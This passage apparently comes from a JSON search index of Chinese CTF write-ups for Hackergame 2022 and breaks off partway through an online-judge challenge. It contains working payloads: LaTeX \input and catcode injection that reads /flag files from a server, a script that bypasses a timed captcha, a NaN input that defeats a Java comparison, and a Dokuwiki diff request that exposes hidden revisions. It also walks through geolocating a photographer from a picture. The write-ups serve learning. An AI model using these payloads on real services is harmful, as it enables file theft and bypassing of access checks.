HeiLang\uff0c\u57fa\u4e8e\u7b2c\u4e09\u4ee3\u5927\u87d2\u86c7\u8bed\u8a00\uff0c\u4f46\u662f\u629b\u5f03\u4e86\u539f\u6709\u7684\u96be\u4ee5\u7406\u89e3\u7684 | \u8fd0\u7b97\uff0c\u5347\u7ea7\u4e3a\u4e86\u66f4\u52a0\u5148\u8fdb\u7684\u8bed\u6cd5\uff0c\u7528 A[x | y | z] = t \u6765\u8868\u793a\u4e4b\u524d\u590d\u6742\u7684 A[x] = t; A[y] = t; A[z] = t\u3002</p> <p>\u4f5c\u4e3a\u4e00\u4e2a\u7f16\u7a0b\u7231\u597d\u8005\uff0c\u6211\u89c9\u5f97\u5b9e\u5728\u662f\u592a\u9177\u4e86\uff0c\u5f88\u7b26\u5408\u6211\u5bf9\u672a\u6765\u7f16\u7a0b\u8bed\u8a00\u7684\u60f3\u8c61\uff0c\u79d1\u6280\u5e76\u5e26\u7740\u8da3\u5473\u3002</p> <p>\u9898\u7ed9\u4e86\u4e00\u4e2a\u4ee5\u8fd9\u79cd\u8bed\u6cd5\u5199\u7684\u751f\u6210\u6570\u7ec4\u7684\u4ee3\u7801\uff0c\u4ee5\u53ca\u9a8c\u8bc1\u7ed3\u679c\u7684 python \u4ee3\u7801\u3002\u5176\u5b9e\u9898\u76ee\u5df2\u7ecf\u8bf4\u7684\u5f88\u660e\u786e\u4e86\uff0c\u4e0d\u8fc7\u61d2\u5f97\u5199\uff0c\u8bb0\u5f97 GitHub \u4e0a\u770b\u5230\u8fc7\u4e00\u4e2a\u9879\u76ee HeLang\uff0c\u4e0d\u8fc7\u91cc\u9762\u7684\u6570\u7ec4\u4e0b\u6807\u4ece 1 \u5f00\u59cb\uff0c\u6240\u4ee5\u5c31\u5199\u4e86\u6bb5\u4ee3\u7801\u6765\u5c06 [] \u4e2d\u7684\u6570\u90fd\u52a0\u4e00\uff0c\u8dd1\u4e00\u904d\u8f93\u51fa\u6570\u7ec4 a\uff0c\u7136\u540e\u66ff\u4ee3\u539f\u6765\u6587\u4ef6\u91cc\u7684\u90e8\u5206\uff0c\u8dd1\u4e00\u4e0b\u5c31\u53ef\u4ee5\u62ff\u5230 flag\uff1aflag{6d9ad6e9a6268d96-97091f6fffb6935c}</p>"},{"location":"writeups/hackergame2022/#xcaptcha","title":"Xcaptcha","text":"<p>\u9898\u76ee\u592a\u957f\u4e86\uff0c\u7701\u7565\u4e86\u90e8\u5206\u80cc\u666f\u6545\u4e8b</p> <p>\u4f17\u4eba\u76ee\u76ee\u76f8\u89d1\u3002</p> <p>\u300c\u6211\u6765\u8bd5\u8bd5\u3002\u300d\uff0c\u4e00\u540d\u961f\u5458\u4e0a\u524d\u70b9\u51fb\u4e86\u6309\u94ae\u3002\u7136\u540e\uff0c\u5c4f\u5e55\u663e\u793a\u300c\u8bf7\u5728\u4e00\u79d2\u5185\u5b8c\u6210\u4ee5\u4e0b\u52a0\u6cd5\u8ba1\u7b97\u300d\u3002</p> <p>\u8fd8\u6ca1\u7b49\u53cd\u5e94\u8fc7\u6765\uff0c\u5c4f\u5e55\u4e0a\u7684\u5b57\u53c8\u5f00\u59cb\u53d8\u5e7b\uff0c\u663e\u793a\u7740\u300c\u9a8c\u8bc1\u5931\u8d25\u300d\u3002\u800c\u4f60\u4f5c\u4e3a\u7a81\u51fb\u961f\u4e2d\u552f\u4e00\u7684\u9ed1\u5ba2\uff0c\u5168\u6751\u4eba\u6c11\u6700\u540e\u7684\u5e0c\u671b\uff0c\u8fce\u7740\u7eb7\u7eb7\u6295\u6765\u7684\u76ee\u5149\uff0c\u80fd\u5426\u5728\u89c4\u5b9a\u65f6\u95f4\u5185\u5b8c\u6210\u9a8c\u8bc1\uff0c\u6253\u5f00\u673a\u623f\uff0c\u4e0d\uff0c\u63a8\u5f00\u548c\u5e73\u65f6\u4ee3\u7684\u5927\u95e8\uff1f</p> <p>\u5927\u6982\u5c31\u662f\u70b9\u51fb\u8ba4\u8bc1\u540e\u5728\u4e00\u79d2\u5185\u8ba1\u7b97\u4e09\u4e2a\u5927\u6574\u6570\u52a0\u6cd5\u7136\u540e\u63d0\u4ea4\u3002\u624b\u5feb\u5b58\u4e00\u4efd html\uff0c\u6309\u7167\u5176\u4e2d\u8981\u6c42\u6b63\u5219\u4e00\u4e0b\u63d0\u53d6\u51fa\u7b97\u5f0f\u7136\u540e\u505a\u52a0\u6cd5\u518d post \u56de\u53bb\u3002</p> <pre><code>import re, requests\nurl = \"http://202.38.93.111:10047/xcaptcha\"\ns = requests.session()\ns.get(\"http://202.38.93.111:10047/?token=\u2026\u2026\")\nres = re.findall(r\"&gt;(\\d*?)\\+(\\d*?) \", s.get(url).text)\nprint(s.post(url, data={f'captcha{i+1}': str(int(res[i][0]) + int(res[i][1])) for i in range(3)}).text)\n</code></pre> <p>\uff08\u7ecf\u5178\u538b\u884c\uff09\u8dd1\u4e00\u4e0b\u62ff\u5230 flag\uff1aflag{head1E55_br0w5er_and_ReQuEsTs_areallyour_FR1ENd_\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#latex","title":"LaTeX \u673a\u5668\u4eba","text":"<p>\u5728\u7f51\u4e0a\u793e\u4ea4\u7fa4\u7ec4\u4e2d\u4ea4\u6d41\u6570\u5b66\u548c\u7269\u7406\u95ee\u9898\u65f6\uff0c\u603b\u662f\u514d\u4e0d\u4e86\u8f93\u5165\u516c\u5f0f\u3002\u800c\u663e\u7136\u5927\u591a\u6570\u5e38\u7528\u7684\u804a\u5929\u8f6f\u4ef6\u5e76\u4e0d\u80fd\u505a\u5230\u8fd9\u4e00\u70b9\u3002\u4e3a\u4e86\u65b9\u4fbf\u5927\u5bb6\u5728\u6c34\u7fa4\u548c\u5356\u5f31\u4e4b\u4f59\u80fd\u591f\u9ad8\u6548\u5730\u8fdb\u884c\u5b66\u672f\u4ea4\u6d41\uff0cG \u793e\u7684\u540c\u5b66\u5236\u4f5c\u4e86\u4e00\u4e2a\u7b80\u5355\u6613\u7528\u7684\u5c06 LaTeX \u516c\u5f0f\u4ee3\u7801\u8f6c\u6362\u6210\u56fe\u7247\u7684\u7f51\u7ad9\uff0c\u5e76\u901a\u8fc7\u804a\u5929\u673a\u5668\u4eba\u5728\u7fa4\u91cc\u5b9e\u65f6\u5c06\u7fa4\u53cb\u53d1\u9001\u7684\u516c\u5f0f\u8f6c\u6362\u6210\u56fe\u7247\u53d1\u51fa\u3002</p> <p>\u8fd9\u4e2a\u7f51\u7ad9\u7684\u601d\u8def\u4e5f\u5f88\u76f4\u63a5\uff1a\u628a\u7528\u6237\u8f93\u5165\u7684 LaTeX \u63d2\u5165\u5230\u4e00\u4e2a\u5199\u597d\u5934\u90e8\u548c\u5c3e\u90e8\u7684 TeX \u6587\u4ef6\u4e2d\uff0c\u5c06\u6587\u4ef6\u7f16\u8bd1\u6210 PDF\uff0c\u518d\u5c06 PDF \u88c1\u526a\u6210\u5927\u5c0f\u5408\u9002\u7684\u56fe\u7247\u3002</p> <p>\u201cLaTeX \u53c8\u4e0d\u662f\u88ab\u7f16\u8bd1\u6267\u884c\u7684\u4ee3\u7801\uff0c\u8fd9\u79cd\u4e1c\u897f\u4e0d\u4f1a\u6709\u4e8b\u7684\u3002\u201d</p> <p>\u7269\u7406\u51fa\u8eab\u7684\u5f00\u53d1\u8005\u4eec\u660e\u663e\u4e0d\u662f\u592a\u5728\u610f\u8fd9\u4e2a\u7f51\u7ad9\u7684\u5b89\u5168\u95ee\u9898\uff0c\u4e5f\u6ca1\u6709\u5bf9\u7528\u6237\u7684\u8f93\u5165\u505a\u4efb\u4f55\u68c0\u67e5\u3002</p> <p>\u90a3\u4f60\u80fd\u60f3\u529e\u6cd5\u83b7\u5f97\u670d\u52a1\u5668\u4e0a\u653e\u5728\u6839\u76ee\u5f55\u4e0b\u7684 flag \u5417\uff1f</p> <p>\u7eaf\u6587\u672c</p> <p>\u7b2c\u4e00\u4e2a flag \u4f4d\u4e8e /flag1\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u7531\u7eaf\u6587\u672c\u7ec4\u6210\uff08\u5373\u53ea\u5305\u542b\u5927\u5199\u5c0f\u5199\u5b57\u6bcd\u548c\u6570\u5b57 0-9\uff09\u3002</p> <p>\u7279\u6b8a\u5b57\u7b26\u6df7\u5165</p> <p>\u7b2c\u4e8c\u4e2a flag \u4f4d\u4e8e /flag2\uff0c\u8fd9\u6b21\uff0cflag \u82b1\u62ec\u53f7\u5185\u7684\u5185\u5bb9\u9664\u4e86\u5b57\u6bcd\u548c\u6570\u5b57\u4e4b\u5916\uff0c\u8fd8\u6df7\u5165\u4e86\u4e24\u79cd\u7279\u6b8a\u5b57\u7b26\uff1a\u4e0b\u5212\u7ebf\uff08_\uff09\u548c\u4e95\u53f7\uff08#\uff09\u3002\u4f60\u53ef\u80fd\u9700\u8981\u60f3\u4e9b\u5176\u4ed6\u529e\u6cd5\u4e86\u3002</p> <p>\u7b2c\u4e00\u4e2a flag \u5f88\u7b80\u5355\uff0c\u53ea\u9700\u8981 input \u4e00\u4e0b\u5373\u53ef\uff1a<code>\\input{/flag1}</code>\uff0c\u53ef\u4ee5\u770b\u5230 flag\uff1aflag{becAr3fu11dUd3\u2026\u2026}\u3002</p> <p>\u7b2c\u4e8c\u4e2a flag \u56e0\u4e3a\u91cc\u9762\u5305\u542b\u7279\u6b8a\u5b57\u7b26\uff0c\u6240\u4ee5\u5728\u6e32\u67d3\u7684\u65f6\u5019\u4f1a\u51fa\u73b0\u9519\u8bef\u3002\u89e3\u51b3\u65b9\u6848\u662f\u5229\u7528 LaTeX \u7684 active character \u6982\u5ff5\u6765\u5c06 _ \u548c # \u66ff\u6362\u4e3a \\_ \u548c \\#\uff0c\u5148\u5c06\u5176\u5b57\u7b26\u7684 catcode \u8bbe\u7f6e\u4e3a \\active\uff0c\u7136\u540e\u5b9a\u4e49\u547d\u4ee4\u5e8f\u5217\u3002payload \u4e3a\uff1a <pre><code>$$\\catcode`\\_=\\active \\def_{\\_} \\catcode`\\#=\\active \\def#{\\#}\\input{/flag2}$$\n</code></pre> \u5f97\u5230 flag\uff1aflag{latex_bec_0_m##es_co__#ol_\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#_4","title":"\u94fe\u4e0a\u8bb0\u5fc6\u5927\u5e08","text":"<p>\u542c\u8bf4\u4f60\u5728\u533a\u5757\u94fe\u4e0a\u90e8\u7f72\u7684\u667a\u80fd\u5408\u7ea6\u6709\u8fc7\u76ee\u4e0d\u5fd8\u7684\u80fd\u529b\u3002</p> <p>\u7b2c\u4e00\u9053\u9898\u9898\u76ee\u5408\u7ea6\uff1a <pre><code>pragma solidity =0.8.17;\n\ninterface MemoryMaster {\n    function memorize(uint256 n) external;\n    function recall() external view returns (uint256);\n}\n\ncontract Challenge {\n    function test(MemoryMaster m, uint256 n) external returns (bool) {\n        m.memorize(n);\n        uint256 recalled = m.recall();\n        return recalled == n;\n    }\n}\n</code></pre></p> <p>\u5f88\u7b80\u5355\uff0c\u5199\u4e00\u4e2a\u5408\u7ea6\u5b58\u503c\uff0c\u5b9e\u73b0 memorize \u548c recall \u65b9\u6cd5\u5b58\u53d6\u503c\u5373\u53ef\uff1a <pre><code>pragma solidity =0.8.17;\n\ncontract Exploit {\n    uint256 num;\n    function memorize(uint256 n) external {\n        num = n;\n    }\n    function recall() external view returns(uint256) {\n        return num;\n    }\n}\n</code></pre></p> <p>Remix \u91cc\u7f16\u8bd1\u7136\u540e\u4e0a\u4f20\u5373\u53ef\uff0cflag\uff1aflag{Y0u_Ar3_n0w_f4M1l1ar_W1th_S0l1dity_st0rage_\u2026\u2026}</p> <p>\u7b2c\u4e00\u9898\u62a2\u4e86\u4e00\u8840\u3002\u7b2c\u4e8c\u4e09\u9898\u770b\u4e86\u5c5e\u5b9e\u8499\u5708\u3002\u7b2c\u4e8c\u9898\u5728\u8c03\u7528 memorize \u4e4b\u540e\u63a5\u4e86\u4e00\u4e2a revert \u6062\u590d\u72b6\u6001\u53d8\u5316\u3002\u7b2c\u4e09\u9898\u9650\u5b9a memorize \u65b9\u6cd5\u4e3a view \u51fd\u6570\uff0c\u5373\u4e0d\u80fd\u4fee\u6539\u72b6\u6001\u3002\u611f\u89c9\u5f88\u795e\u5947\uff0c\u53ef\u80fd\u662f\u7528\u4e86\u67d0\u4e9b EVM \u7279\u6027\u5427\u3002\u8e72 wp \u5b66\u5b66\u3002</p>"},{"location":"writeups/hackergame2022/#20","title":"\u65c5\u884c\u7167\u7247 2.0","text":"<p>\u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u84c4\u8c0b\u5df2\u4e45\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u5e94\u8be5\u662f\u53c8\u88ab\u4ed6\u4f4f\u4e0b\u4e86\u3002</p> <p></p>"},{"location":"writeups/hackergame2022/#_5","title":"\u7167\u7247\u5206\u6790","text":"<p>\u7b2c\u4e00\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247 exif \u4fe1\u606f\u7684\u95ee\u9898\uff0c\u76f4\u63a5\u4f7f\u7528 exiftool \u8bfb\u53d6\u5373\u53ef\uff1a</p> <ol> <li>\u56fe\u7247\u6240\u5305\u542b\u7684 EXIF \u4fe1\u606f\u7248\u672c\u662f\u591a\u5c11\uff1f\uff08\u5982 2.1\uff09\u3002</li> </ol> <p>exiftool \u663e\u793a\u662f 0231\uff0c\u4f46\u5b9e\u9645\u4e0a\u662f 2.31\u3002</p> <ol> <li>\u62cd\u7167\u4f7f\u7528\u624b\u673a\u7684\u54c1\u724c\u662f\u4ec0\u4e48\uff1f</li> </ol> <p>exiftool \u53ef\u4ee5\u770b\u5230 <code>Make: Xiaomi</code>\uff0c\u6240\u4ee5\u7b54\u6848\u662f \u5c0f\u7c73/\u7ea2\u7c73\u3002</p> <ol> <li>\u8be5\u56fe\u7247\u88ab\u62cd\u6444\u65f6\u76f8\u673a\u7684\u611f\u5149\u5ea6\uff08ISO\uff09\u662f\u591a\u5c11\uff1f\uff08\u6574\u6570\u6570\u5b57\uff0c\u5982 3200\uff09</li> </ol> <p><code>ISO: 84</code>\uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 84\u3002</p> <ol> <li>\u7167\u7247\u62cd\u6444\u65e5\u671f\u662f\u54ea\u4e00\u5929\uff1f\uff08\u683c\u5f0f\u4e3a\u5e74/\u6708/\u65e5\uff0c\u5982 2022/10/01\u3002\u6309\u62cd\u6444\u5730\u70b9\u5f53\u5730\u65e5\u671f\u8ba1\u7b97\u3002\uff09</li> </ol> <p><code>Create Date: 2022:05:14 18:23:35.220027+09:00</code>\uff0c\u6240\u4ee5\u7b54\u6848\u4e3a 2022/05/14\u3002</p> <ol> <li>\u7167\u7247\u62cd\u6444\u65f6\u662f\u5426\u4f7f\u7528\u4e86\u95ea\u5149\u706f\uff1f</li> </ol> <p><code>Flash: Off, Did not fire</code>\uff08\u6216\u8005\u770b\u53cd\u5149\u4e5f\u80fd\u770b\u51fa\u6765\uff09\u6240\u4ee5\u7b54\u6848\u4e3a \u5426\u3002</p> <p>flag\uff1aflag{1f_y0u_d0NT_w4nt_shOw_theSe_th3n_w1Pe_EXlF}</p>"},{"location":"writeups/hackergame2022/#_6","title":"\u793e\u5de5\u5b9e\u8df5","text":"<p>\u63a5\u4e0b\u6765\u7b2c\u4e8c\u90e8\u5206\u662f\u4e94\u4e2a\u5173\u4e8e\u56fe\u7247\u793e\u5de5\u5206\u6790\u7684\u95ee\u9898\u3002</p> <ol> <li>\u8bf7\u5199\u51fa\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\u7684\u90ae\u653f\u7f16\u7801\uff0c\u683c\u5f0f\u4e3a 3 \u81f3 10 \u4f4d\u6570\u5b57\uff0c\u4e0d\u542b\u7a7a\u683c\u6216\u4e0b\u5212\u7ebf\u7b49\u7279\u6b8a\u7b26\u53f7\uff08\u5982 230026\u300194720\uff09\u3002</li> </ol> <p>\u901a\u8fc7\u653e\u5927\u56fe\u7247\u53ef\u4ee5\u770b\u5230\u697c\u4e0b\u7684\u4f53\u80b2\u9986\u5916\u9762\u5199\u7684\u6709 \u201cZOZO\u201d \u6837\u5f0f\uff0c\u641c\u7d22\u53ef\u4ee5\u627e\u5230\u8fd9\u91cc\u662f\u65e5\u672c\u5343\u53f6\u6d77\u6d0b\u7403\u573a\u3002\u901a\u8fc7 Google \u5730\u56fe\u627e\u5230\u62cd\u7167\u4eba\u6240\u5728\u5730\u70b9\uff1aAPA HOTEL&amp; RESORT TOKYO BAY MAKUHARI \u3012261-0021 Chiba, Mihama Ward, Hibino, 2 Chome-3\uff0c\u6240\u4ee5\u90ae\u7f16\u4e3a 2610021\u3002\uff08\u8fd9\u91cc\u6709\u4e2a\u5751\uff0c\u65e5\u672c\u90ae\u7f16\u5212\u5206\u5f88\u7ec6\uff0c\u7403\u573a\u548c\u9152\u5e97\u7684\u90ae\u7f16\u4e0d\u4e00\u6837\uff0c\u6240\u4ee5\u8981\u6ce8\u610f\uff09</p> <ol> <li>\u7167\u7247\u7a97\u6237\u4e0a\u53cd\u5c04\u51fa\u4e86\u62cd\u7167\u4eba\u7684\u624b\u673a\u3002\u90a3\u4e48\u8fd9\u90e8\u624b\u673a\u7684\u5c4f\u5e55\u5206\u8fa8\u7387\u662f\u591a\u5c11\u5462\uff1f\uff08\u683c\u5f0f\u4e3a\u957f + \u5b57\u6bcd x + \u5bbd\uff0c\u5982 1920x1080\uff09</li> </ol> <p>\u901a\u8fc7\u4eac\u4e1c\u641c\u7d22\u5c0f\u7c73\u624b\u673a\uff0c\u4ee5\u53ca\u73bb\u7483\u53cd\u5149\u4e2d\u7684\u540e\u7f6e\u6444\u50cf\u5934\u6837\u5f0f\u53ef\u4ee5\u77e5\u9053\u8fd9\u90e8\u624b\u673a\u662f\u7ea2\u7c73 Note 9\uff0c\u5c4f\u5e55\u5206\u8fa8\u7387\u4e3a 2340x1080\u3002</p> <ol> <li>\u4ed4\u7ec6\u89c2\u5bdf\uff0c\u53ef\u4ee5\u53d1\u73b0\u7167\u7247\u7a7a\u4e2d\uff08\u767d\u8272\u4e91\u4e0a\u65b9\u4e2d\u95f4\u4f4d\u7f6e\uff09\u6709\u4e00\u67b6\u98de\u673a\u3002\u4f60\u80fd\u8c03\u67e5\u51fa\u8fd9\u67b6\u98de\u673a\u7684\u4fe1\u606f\u5417\uff1f\uff0c\u5305\u62ec \u8d77\u98de\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 PEK\uff09\u3001\u964d\u843d\u673a\u573a\uff08IATA \u673a\u573a\u7f16\u53f7\uff0c\u5982 HFE\uff09\u3001\u822a\u73ed\u53f7\uff08\u4e24\u4e2a\u5927\u5199\u5b57\u6bcd\u548c\u82e5\u5e72\u4e2a\u6570\u5b57\uff0c\u5982 CA1813\uff09</li> </ol> <p>\u505a\u8fd9\u9053\u9898\u7684\u65f6\u5019\u65f6\u95f4\u6b63\u597d\u662f\u4e0b\u5348\u4e94\u70b9\u4e8c\u5341\u591a\uff0c\u5bf9\u5e94\u65e5\u672c\u65f6\u95f4\u4e0b\u5348\u516d\u70b9\u4e8c\u5341\u591a\uff0c\u4e5f\u5c31\u662f\u7c7b\u4f3c\u62cd\u7167\u7684\u65f6\u95f4\uff0c\u5728\u5b9e\u65f6\u98de\u673a\u822a\u7ebf\u5730\u56fe\u4e2d\u6b63\u597d\u770b\u89c1\u6709\u4e00\u67b6\u98de\u673a\u5728\u8be5\u5904\u4e0a\u7a7a\uff0c\u8d77\u98de\u673a\u573a\u662f HND\u3002\u901a\u8fc7\u98de\u673a\u65b9\u5411\u53ef\u4ee5\u786e\u5b9a\u8d77\u98de\u673a\u573a\u5c31\u662f HND\u3002\u7136\u540e\u627e\u5230\u6bcf\u5929\u5927\u6982\u8fd9\u4e2a\u65f6\u95f4\u4ece HND \u51fa\u53d1\u5411\u5317\u7684\u98de\u673a\uff0c\u901a\u8fc7\u5c1d\u8bd5\u5f97\u5230\u964d\u843d\u673a\u573a\u4e3a HIJ\uff0c\u822a\u73ed\u53f7\u4e3a NH683\u3002\uff08\u4e5f\u53ef\u4ee5\u7206\u7834\uff0c\u8fd9\u9053\u9898\u7684\u9a8c\u9898\u903b\u8f91\u662f\u5c06\u8868\u5355\u7ed3\u679c\u8fdb\u884c base64\uff0c\u7136\u540e GET \u7ed3\u679c.txt\uff0c\u6b63\u786e\u5219 200 \u4e14\u91cc\u9762\u662f flag\uff0c\u9519\u8bef\u5219 404\uff09</p> <p>flag\uff1aflag{Buzz_0ver_y0ur_h34d_and_4DSB_m19ht_111egal}</p>"},{"location":"writeups/hackergame2022/#_7","title":"\u731c\u6570\u5b57","text":"<p>\u8fd9\u4e2a\u5c0f\u6e38\u620f\u9700\u8981\u505a\u7684\u4e8b\u60c5\u975e\u5e38\u7b80\u5355\uff1a\u5728 0 \u548c 1 \u4e4b\u95f4\u731c\u4e00\u4e2a\u6570\u5b57\uff08\u7cbe\u786e\u5230\u5c0f\u6570\u70b9\u540e 6 \u4f4d\uff09\uff0c\u5e76\u901a\u8fc7\u53cd\u9988\u7684\u300c\u5927\u300d\u8fd8\u662f\u300c\u5c0f\u300d\u4fee\u6b63\u731c\u6d4b\uff0c\u76f4\u81f3\u5b8c\u5168\u731c\u4e2d\u3002\u4e00\u6b21\u6027\u547d\u4e2d\u7684\u6982\u7387\u663e\u7136\u4e5f\u662f\u4e00\u767e\u4e07\u5206\u4e4b\u4e00\uff08\u548c\u4e94\u8fb9\u5f62\u7684\u300c\u5ae9\u725b\u4e03\u65b9\u300d\u8fbe\u6210\u4e86\u67d0\u79cd\u610f\u4e49\u4e0a\u7684\u540c\u6784\uff09\u2014\u2014\u4f46\u4ece\u5b66\u9738\u5ba4\u53cb\u624b\u4e2d\u501f\u6765\u7684\u6982\u7387\u8bba\u4e0e\u7edf\u8ba1\u5b66\u7b14\u8bb0\u4e0a\u4e07\u5343\u516c\u5f0f\u7684\u6a21\u6837\u5728\u601d\u7eea\u4e2d\u4e00\u77ac\u800c\u8fc7\uff0c\u4e8e\u662f\u4f60\u9ed8\u9ed8\u7948\u7977\u7740\u5927\u6570\u5b9a\u7406\uff0c\u8654\u8bda\u5730\u6309\u4e0b\u4e86\u63d0\u4ea4\u7684\u6309\u94ae\u3002</p> <p>\u9898\u76ee\u7ed9\u51fa\u4e86\u7f51\u9875\u670d\u52a1\u7684 Java \u6e90\u7801\u3002\u672c\u6765\u60f3\u7740\u662f\u7206\u7834\u4f2a\u968f\u673a\u6570\uff0c\u4e0d\u8fc7\u6e90\u7801\u91cc\u7528\u7684\u662f SecureRandom\uff0c\u4e0d\u80fd\u7206\u7834\u3002\u7136\u540e\u4ed4\u7ec6\u770b\u6e90\u7801\u3002\u53d1\u73b0\u4e86\u4e00\u4e9b\u6bd4\u8f83\u53ef\u7591\u7684\u4e1c\u897f\uff0c\u660e\u660e\u6bd4\u8f83\u7684\u90fd\u662f\u516d\u4f4d\u5c0f\u6570\uff0c\u662f\u53ef\u4ee5\u4e58 1000000 \u7136\u540e\u5224\u65ad\u6574\u6570\u76f8\u7b49\u7684\uff0c\u4f46\u5b83\u504f\u8981\u6bd4\u8f83\u8f93\u5165\u548c\u4e24\u4e2a\u5c0f\u6570\u7684\u5927\u5c0f\uff08\u662f\u5426\u4e0d\u5927\u4e8e\u4e14\u4e0d\u5c0f\u4e8e\uff09\u3002\u800c\u5982\u679c\u8f93\u5165\u662f NaN\uff0c\u5219\u4efb\u4f55\u6bd4\u8f83\u90fd\u662f False\uff0c\u4e5f\u5c31\u8ba9\u7a0b\u5e8f\u8ba4\u4e3a\u8f93\u5165\u548c\u9884\u671f\u76f8\u7b49\u4e86\u3002</p> <p>\u4e0d\u8fc7\u56e0\u4e3a\u89c4\u5b9a\u4e86\u5c0f\u6570\uff0c\u6240\u4ee5 NaN \u5728\u524d\u7aef\u4e0d\u80fd\u76f4\u63a5\u5199\u5165\uff0c\u9700\u8981\u624b\u52a8 POST \u5230 <code>/state</code>\uff0c\u7528\u4e00\u4e2a\u4efb\u610f\u6570\u5b57\u8bd5\u4e00\u4e0b\uff0c\u53ef\u4ee5\u5728 DevTool \u91cc\u6355\u83b7\u5230 POST \u6570\u636e\u683c\u5f0f\u3002\u7136\u540e\u624b\u52a8 POST \u4e00\u4e2a &lt;state&gt;&lt;guess&gt;NaN&lt;/guess&gt;&lt;/state&gt; \u518d GET \u4e00\u4e0b\u5c31\u80fd\u5728\u8fd4\u56de\u6570\u636e\u4e2d\u770b\u5230 flag\uff1aflag{gu3ss-n0t-a-numb3r-1nst3ad-\u2026\u2026}</p>"},{"location":"writeups/hackergame2022/#flag","title":"Flag \u7684\u75d5\u8ff9","text":"<p>\u5c0f Z \u542c\u8bf4 Dokuwiki \u914d\u7f6e\u5f88\u7b80\u5355\uff0c\u6240\u4ee5\u5728\u81ea\u5df1\u7684\u673a\u5668\u4e0a\u6574\u4e86\u4e00\u4efd\u3002\u53ef\u662f\u4e0d\u5de7\u7684\u662f\uff0c\u4ed6\u4e00\u4e0d\u5c0f\u5fc3\u628a\u73cd\u8d35\u7684 flag \u7c98\u8d34\u5230\u4e86 wiki \u9996\u9875\u63d0\u4ea4\u4e86\uff01\u4ed6\u8d76\u7d27\u6539\u597d\uff0c\u5e76\u4e14\u4e5f\u628a\u5386\u53f2\u8bb0\u5f55\uff08revisions\uff09\u529f\u80fd\u5173\u6389\u4e86\u3002</p> <p>\u300c\u8fd9\u6837\u5c31\u5e94\u8be5\u5c31\u4e0d\u4f1a\u6cc4\u6f0f flag \u4e86\u5427\u300d\uff0c\u5c0f Z \u5982\u662f\u5b89\u6170\u81ea\u5df1\u3002</p> <p>\u7136\u800c\u4e8b\u5b9e\u771f\u7684\u5982\u6b64\u5417\uff1f</p> <p>\uff08\u9898\u76ee Dokuwiki \u7248\u672c\u57fa\u4e8e 2022-07-31a \"Igor\"\uff09</p> <p>\u4e00\u4e2a Dokuwiki \u6846\u67b6\u642d\u7684\u7f51\u7ad9\uff0c\u76ee\u6807\u662f\u627e\u5230\u9996\u9875\u7684\u4fee\u6539\u3002\u7248\u672c\u662f\u6700\u65b0\u7684\uff0c\u641c\u4e0d\u5230\u5565\u6f0f\u6d1e\u3002\u81ea\u5df1\u90e8\u7f72\u4e86\u4e00\u4e0b\u73a9\u73a9\uff0c\u770b\u8d77\u6765 revisions \u7b49\u529f\u80fd\u5173\u6389\u4e4b\u540e\u786e\u5b9e\u6ca1\u6cd5\u770b\u4fee\u6539\u8bb0\u5f55\u4e86\u3002\u800c\u4e14\u9898\u76ee\u662f external edit\uff0c\u4e5f\u5c31\u662f\u76f4\u63a5\u4fee\u6539\u4e86\u6587\u4ef6\uff0c\u800c\u6ca1\u6709\u901a\u8fc7\u7f51\u9875\u7f16\u8f91\u3002</p> <p>\u7136\u540e\u5c31\u8bfb\u4e86\u8bfb\u6e90\u7801\uff0c\u641c\u4e86\u4e0b issue \u770b\u5230\u4e86\u4e00\u4e2a revision \u76f8\u5173\u7684 https://github.com/splitbrain/dokuwiki/issues/3576\uff0c\u91cc\u9762\u63d0\u5230\u4e86 <code>?do=diff</code>\uff0c\u5c1d\u8bd5\u8bbf\u95ee <code>/doku.php?id=start&amp;do=diff</code>\uff0c\u786e\u5b9e\u80fd\u770b\u5230\u4fee\u6539\u8bb0\u5f55\uff0c\u5176\u4e2d flag\uff1aflag{d1gandFInD_d0kuw1k1_unexpectEd_API}</p>"},{"location":"writeups/hackergame2022/#_8","title":"\u5b89\u5168\u7684\u5728\u7ebf\u6d4b\u8bc4","text":"<p>\u4f20\u8bf4\u79d1\u5927\u65b0\u7684\u5728\u7ebf\u6d4b\u8bc4\u7cfb\u7edf\uff08Online Judge\uff09\u6b63\u5728\u9510\u610f\u5f00\u53d1\u4e2d\u3002\u7136\u800c\uff0c\u65b0 OJ \u8fdf\u8fdf\u4e0d\u89c1\u8e2a\u5f71\uff0c\u65e7\u7684 OJ \u548c\u66f4\u65e7\u7684 OJ \u5374\u90fd\u5df2\u7ecf\u505c\u6b62\u4e86\u7ef4\u62a4\u3002\u67d0 2022 \u7ea7\u8ba1\u7b97\u673a\u7cfb\u7684\u65b0\u751f\u5c0f L \u7b49\u5f97\u4e0d\u8010\u70e6\u4e86\uff0c\u5f53\u5373\u8868\u793a\u4e0d\u5c31\u662f OJ \u5417\uff0c\u4ed6 10 \u5206\u949f\u5c31\u80fd\u5199\u51fa\u6765\u4e00\u4e2a\u3002</p> <p>\u65e0\u6cd5 AC \u7684\u9898\u76ee</p> <p>\u4e3a\u4e86\u9a8c\u8bc1\u4ed6\u5199\u7684\u65b0 OJ \u7684\u5b89\u5168\u6027\uff0c\u4ed6\u51b3\u5b9a\u5728 OJ \u4e0a\u51fa\u4e00\u9053\u4e0d\u53ef\u80fd\u5b8c\u6210\u7684\u9898\u76ee\u2014\u2014\u5927\u6574\u6570\u5206\u89e3\uff0c\u5e76\u4e14\u653e\u51fa\u8c6a\u8a00\uff1a\u53ea\u8981\u6709\u4eba\u80fd AC \u8fd9\u9053\u9898\uff0c\u5c31\u80fd\u5f97\u5230\u4f20\u8bf4\u4e2d\u7684 flag\u3002\u5f53\u7136\uff0c\u56e0\u4e3a\u76ee\u524d OJ \u53ea\u80fd\u8fd0\u884c C 